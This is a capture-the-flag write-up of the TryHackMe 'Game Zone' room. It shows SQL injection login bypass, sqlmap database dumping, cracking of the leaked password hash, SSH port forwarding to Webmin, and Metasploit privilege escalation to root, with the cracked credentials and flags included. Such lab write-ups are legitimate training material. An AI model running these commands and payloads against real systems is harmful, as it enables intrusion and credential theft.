# Lab Report - Game Zone


# Overview 
- **Difficulty**: Easy
- **Platform**: Linux
- **Link**: https://tryhackme.com/room/gamezone
- **Tags**: #enumeration  #sqlmap #privesc 

## Challenge Description 
>**Learn to hack into this machine. Understand how to use SQLMap, crack some passwords, reveal services using a reverse SSH tunnel and escalate your privileges to root!**

## Resolution Summary 
**We discovered available services with an `Nmap` scan. Then, we found an HTTP web application that was vulnerable to `SQLi`. Upon logging in, we enumerated the available databases with `SQLMap` then we cracked the user's hash we found with `JTR`. Finally, we logged in the SSH server with the credentials previously found and we found a CMS (Webmin) running locally. We exposed on a local port the Webmin CMS via `Reverse SSH tunneling` and we used `Metasploit` to gain root privileges.** 

# Information Gathering 
- **Since we were given an IP address, we started by scanning it using `Nmap` in to find available services. We also used the `-sV` flag to potentially find version-related vulnerabilities:** 
```bash
sudo nmap -sV 10.10.71.155
```
	- Note: Adding the `-p-` flag did not provide additional results.

- **We received the following results:**
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

- **From there, we started by investigating the HTTP server.** 
## HTTP (80)
- **Upon accessing the web application, we come across a web page with a login portal, which can be further investigated for several potential vulnerabilities.**

- **First, we started by looking at the Source Page, which can sometimes bear low-hanging fruit. However, it has proven unsuccessful here. 

- **Next, we attempt a GoBuster scan in order to find potential hidden directories:**
```bash
gobuster dir -u 10.10.71.155 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k -t 64
```
	- Note: it did not provide any tangible result.

- **Since we had access to a login portal, we could try and inspect the login request using Burp Suite, which could have provided us insight on the authentication process and information for a credential fuzzing with `ffuf`.**

- **We started by making a login attempt, next  we intercepted it with Burp Suite and we sent it to Repeater for further inspection.** 
- **From there we collect information on the request structure and the failed attempted error message. Now we could use fuzzing tools such as `ffuf` in order to brute force the login portal.** 
```bash
username=[value]&password=[value]&x=[coord]&y=[coord]
#failed attempt error message 
Incorrect login
```
	-Note: we could verify (through multiple test requests) that x,y are coordinates of the click (on the Enter button).

- **First, we can attempt to see if we can enumerate users (instead of fuzzing with 2 wordlists at the same time):**
```bash
ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt:FUZZ -X POST -d "username=FUZZ&password=dummy&x=25&y=15"  -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.71.155 -mr "Incorrect login"
```

- **While waiting for the results, we attempted some basic SQL injections from Burp Suite Repeater.**
- **Fortunately, the following payload  `' or 1=1;--` allowed us the access a new page:**
```bash
username=' or 1=1;--&password=dummy&x=25&y=15
```

- **Next, we came across a web page where we can search for game and get reviews on them. From there we assume there is an SQL logic behind that system too.** 
- **A common practice would be to confuse the server with an unexpected output that would likely break the SQL query. This might result in a error message, which could provide important information on the system.** 

- **From now on, we moved to `sqlmap` in order to fingerprint the database.**

# Exploitation 
## HTTP (80)
- **Before using `sqlmap`, we made another Burp Suite request in order to have an idea on the request structure and to find valuable parameters. Here the result we got from this:**
```bash
#Parameter
searchitem=[value]
#Cookie (useful in order to make sqlmap use our authenticated session)
cookie="PHPSESSID=pcod9e0cnn7mt0ee9inl5u78m7"
```

- **Next, we used sqlmap with the following parameters in order to find the names of the available databases:**
```bash
sqlmap  -u http://10.10.71.155/portal.php --data "searchitem=test" -p searchitem --dbs  --cookie="PHPSESSID=pcod9e0cnn7mt0ee9inl5u78m7"
```

- **And we got as a result:**
```bash
[16:23:33] [INFO] fetching database names
available databases [5]:
[*] db
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
```

- **Now that we have databases' name, we can list their tables:**
```bash
sqlmap -u http://10.10.71.155/portal.php --data "searchitem=test" -p searchitem --tables --cookie="PHPSESSID=pcod9e0cnn7mt0ee9inl5u78m7"
```

- **Here are some interesting tables we found:**
```bash
Database: db
[2 tables]
+------------------------------------------------------+
| post                                                 |
| users                                                |
+------------------------------------------------------+
```

- **Next we tried to dump the content of the users' table by using:**
```bash
sqlmap -u http://10.10.71.155/portal.php --data "searchitem=test" -p searchitem --dump -D db -T users --cookie="PHPSESSID=pcod9e0cnn7mt0ee9inl5u78m7"
```

- **We got a user and a hash (most likely its password):**
```bash
agent47:ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
```

- **We attempted to crack the hash using John The Ripper:
- **First, we needed to identify the hash's format in order to speed up the cracking process. Using an [online tool](https://www.tunnelsup.com/hash-analyzer/) we can quickly identify it as a  SHA-256 hash.**

- **Finally, we used the following JTR command in other to crack the hash we captured:**
```bash
john --wordlist=/home/kali/Downloads/rockyou.txt /tmp/sqlmapj9uq_eii53883/sqlmaphashes-6c9i08o1.txt -format=raw-sha256
```

- **And we got the following result:**
```bash
videogamer124    (agent47)
```

- **From there we attempted to access the SSH server we found earlier with these credentials.**
## SSH (22)
- **The credentials previously found allowed us to access the SSH server.** 
- **We were immediately greeted with a flag:** 
	- **`user.txt:649ac17b1480ac13ef1e4fa579dac95c`**

- **In order to expose services, we will be using reverse SSH tunnels:**
- **We can use the `ss` command in order to see what socket connections are running:**
```bash
ss -tulpn
```

- **We received the following results, which expose a service running on port 10000 (blocked via firewall rules from the outside):**
```bash
Netid  State      Recv-Q Send-Q          Local Address:Port                         Peer Address:Port              
udp    UNCONN     0      0                           *:68                                      *:*                  
udp    UNCONN     0      0                           *:10000                                   *:*                  
tcp    LISTEN     0      128                         *:22                                      *:*                  
tcp    LISTEN     0      80                  127.0.0.1:3306                                    *:*                  
tcp    LISTEN     0      128                         *:10000                                   *:*                  
tcp    LISTEN     0      128                        :::22                                     :::*                  
tcp    LISTEN     0      128                        :::80                                     :::* 
```

- **Thus, we used an SSH tunnel in order to expose that port to us locally:**
```bash
ssh -L 10000:localhost:10000 agent47@10.10.71.155 #From attacking machine
```

- **We came across a CMS (Webmin), we tried to fingerprint it first by using `whatweb` in order to gather information on the target:**
```bash
whatweb http://localhost:10000
```

- **As a result:**
```bash
http://localhost:10000 [200 OK] Cookies[testing], HTTPServer[MiniServ/1.580], IP[::1], Script[text/javascript], Title[Login to Webmin]
```

- **Now we tried to see if there is any exploit available on Metasploit in order to elevate our current privileges up to root.**
# Privilege Escalation 
- **We launched Metasploit and executed the following commands:** 
```bash
msfconsole 
search webmin
use unix/webapp/webmin_show_cgi_exec #we used info beforehand 
show options
# we set the required options
run
```
	-Note: We tried many exploits before finding a successful one. 

- **Finally, we obtained a shell with root privileges (confirmed with the `whoami` command). We got the final flag too.** 

# Trophy 
**User.txt → `649ac17b1480ac13ef1e4fa579dac95c`** 

**Root.txt → `a4b945830144bdd71908d12d902adeee`**

# Remediation Summary
- **Restrict port opening/exposing privileges.**
- **Update outdated packages and software.**
- **Sanitize user input to prevent injection attacks.** 
# Lessons Learned
- **Use your authenticated cookies on tools such as sqlmap to avoid redirections to login portals.** 
- **Always try many exploits in Metasploit. Use `setg` to set options only one time (global).**
- **Use Metasploit for privilege escalation exploits.** 
- **Use reverse SSH tunnels to expose (hidden) services on a target machine to us locally.**
